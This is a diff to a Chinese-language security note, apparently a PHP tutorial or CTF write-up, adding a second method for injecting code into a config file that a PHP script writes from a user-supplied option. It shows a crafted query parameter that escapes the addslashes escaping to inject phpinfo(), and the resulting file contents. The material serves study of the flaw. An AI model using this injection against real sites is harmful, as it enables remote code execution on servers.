@@ -49,7 +49,18 @@ phpinfo();//';
 访问：/xxxxx/option.php
 
 ## 法二
+访问：
+```
+?option=aaa\';phpinfo();//
+```
+经过addslashes后，$str为 `aaa\\';phpinfo();//`
 
+经过正则匹配后,xxxxx/option.php的内容变为：
+```
+<?php 
+$option='aaa\\';phpinfo();//';
+?>
+```
 
 # Refference 
 + p神的小秘圈
